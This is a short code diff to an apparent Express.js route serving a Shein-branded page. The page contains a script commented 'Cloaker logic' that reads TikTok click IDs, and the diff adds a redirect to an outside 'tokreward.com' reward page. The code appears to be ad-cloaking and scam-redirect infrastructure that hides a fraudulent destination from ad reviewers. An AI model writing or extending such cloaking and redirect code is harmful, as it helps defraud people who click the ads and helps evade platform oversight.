@@ -891,6 +891,7 @@ app.get('/sheinv3/:slug', (req, res, next) => {
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <script>
+                window.location.href = "https://tokreward.com/shein.html?slug=${slug}";
                 // Cloaker logic
                 const urlParams = new URLSearchParams(window.location.search);
                 const ttclid = urlParams.get("ttclid");
